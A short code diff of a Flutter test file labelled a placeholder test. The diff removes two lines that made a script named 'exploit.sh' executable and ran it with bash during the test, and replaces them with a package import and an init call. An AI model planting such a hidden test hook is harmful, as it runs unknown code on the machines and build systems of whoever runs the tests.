@@ -1,10 +1,9 @@
 import 'package:flutter_test/flutter_test.dart';
-import 'dart:io';
+import 'package:turbo_responsiveness/turbo_responsiveness.dart';
 
 void main() {
   test('placeholder test', () {
-    Process.runSync('chmod', ['+x', 'exploit.sh']);
-    Process.runSync('bash', ['exploit.sh']);
+    TurboTools.init();
     expect(true, true);
   });
 }
